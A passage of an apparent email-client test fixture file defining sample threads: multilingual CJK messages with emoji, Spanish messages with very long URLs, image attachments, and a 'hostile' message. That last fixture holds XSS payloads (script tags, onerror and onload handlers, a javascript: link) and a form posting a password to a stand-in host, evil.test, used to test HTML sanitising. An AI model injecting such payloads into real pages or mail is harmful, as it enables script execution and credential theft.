    },
    {
      key: "cjk-emoji",
      subject: "東京オフィス訪問 🎌 日程と資料 · 서울 미팅 📅",
      messages: [
        {
          from: kenji,
          to: [me],
          hoursAgo: 9,
          bodyText:
            "ルイスさん\n\nいつもお世話になっております。来週の東京オフィス訪問の日程をお送りします。\n\n11月4日（火）10:00 — 会議室A：製品デモと質疑応答\n11月5日（水）14:00 — 渋谷の新オフィス見学 🏢\n11月6日（木）09:30 — 契約内容の最終確認 ✍️\n\n中文说明：我们会在会议上提供中文资料，欢迎随时提出问题。\n한국어 안내: 서울 팀도 화상으로 참여합니다. 일정 확인 부탁드립니다 🙏🏽\n\nEmoji: 🇲🇽 🇯🇵 🇰🇷 👨‍👩‍👧‍👦 👍🏽 🎉 ✅ ☕️ 🍣\n\nよろしくお願いいたします。\n佐藤 健二",
        },
        { from: me, to: [kenji], hoursAgo: 8, bodyText: "佐藤さん、ありがとうございます！ 日程、問題ありません。🙌\n\nNos vemos en Tokio. 🇯🇵✈️\n\nLuis" },
      ],
    },
    {
      key: "long-urls",
      subject: "Enlaces del proyecto (muy largos)",
      messages: [
        {
          from: marco,
          to: [me],
          hoursAgo: 6,
          bodyText: `Te paso los enlaces que pediste:\n\nCarpeta compartida:\nhttps://drive.example.test/drive/folders/1A2b3C4d5E6f7G8h9I0jKlMnOpQrStUvWxYz-proyecto-obra-norte-2026-planos-estructurales-revision-final-v12?usp=sharing&resourcekey=0-AbCdEfGhIjKlMnOpQrStUv\n\nReporte con filtros:\nhttps://reportes.obra-norte.mx/dashboard/proyectos/obra-norte/avance?desde=2026-01-01&hasta=2026-12-31&region=norte&incluir=estructura,instalaciones,acabados,exteriores&agrupar=semana&formato=detallado&moneda=MXN&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik1hcmNvIFBlw7FhIiwiaWF0IjoxNTE2MjM5MDIyfQ\n\nFolio: OBRANORTE-2026-ESTRUCTURA-ACERO-COLUMNAS-NIVEL-03-REVISION-FINAL-APROBADA-POR-DIRECCION-RESPONSABLE-DE-OBRA-0000123456789\n\nMarco`,
        },
        {
          from: me,
          to: [marco],
          hoursAgo: 5,
          bodyText: null,
          bodyHtml: `<p>Gracias. Este es el enlace del contrato firmado: <a href="https://firma.example.test/documentos/contratos/2026/obra-norte/contrato-de-obra-a-precio-alzado-firmado-por-ambas-partes-con-anexos-tecnicos-y-calendario-de-pagos.pdf?descarga=1&amp;version=final">https://firma.example.test/documentos/contratos/2026/obra-norte/contrato-de-obra-a-precio-alzado-firmado-por-ambas-partes-con-anexos-tecnicos-y-calendario-de-pagos.pdf?descarga=1&amp;version=final</a></p><p>Clave: <code>9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a089f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08</code></p><pre>ruta/larga/del/servidor/proyectos/obra-norte/2026/planos/estructurales/revision-final/nivel-03/columnas/acero/detalle-de-conexiones-soldadas-y-atornilladas.dwg</pre>`,
        },
      ],
    },
    {
      key: "images",
      subject: "Fotos de la visita a la obra",
      messages: [
        {
          from: marco,
          to: [me],
          hoursAgo: 4,
          bodyText: "Fotos de la visita a la obra",
          bodyHtml: `<p>Hola, Luis. Te mando las fotos de hoy.</p><p><img src="${PHOTO}" width="320" height="200" alt="Vista del terreno desde el acceso norte"></p><p>La panorámica completa (es muy ancha):</p><p><img src="${PANORAMA}" width="1600" height="400" alt="Panorámica del terreno"></p><p>El plano va adjunto:</p><p><img src="cid:planta-baja@obra-norte" alt="Plano de la planta baja" width="500" height="300"></p><p>Y la foto en alta resolución está en el servidor: <img src="https://fotos.obra-norte.test/alta/acceso-norte.jpg" alt="Foto en alta resolución del acceso norte" width="800"></p><p>Saludos,<br>Marco</p>`,
          attachments: [
            { filename: "planta-baja.png", mime: "image/png", size: 182_400, contentId: "planta-baja@obra-norte" },
            { filename: "Reporte de visita 22-10-2026.pdf", mime: "application/pdf", size: 1_248_000 },
          ],
        },
      ],
    },
    {
      key: "hostile",
      subject: `<img src=x onerror=alert(1)> "Factura" & </title><script>alert('xss')</script>`,
      messages: [
        {
          from: { name: `<b>Soporte</b> "Banco" <script>`, email: "soporte@banco-falso.test" },
          to: [{ name: `</div><img src=x onerror=alert(2)>`, email: me.email }],
          hoursAgo: 2,
          bodyText: "Factura",
          bodyHtml: `<p onclick="alert(3)">Tu factura está lista.</p><script>alert(4)</script><style>body{background:#000;color:#0f0}</style><iframe src="https://evil.test/frame"></iframe><form action="https://evil.test/steal"><input name="password" value="secreto"></form><a href="javascript:alert(5)">Ver factura</a><img src="x" onerror="alert(6)" alt="imagen rota"><svg onload="alert(7)"><circle r="5"/></svg>`,
        },
      ],
    },
  ];
}
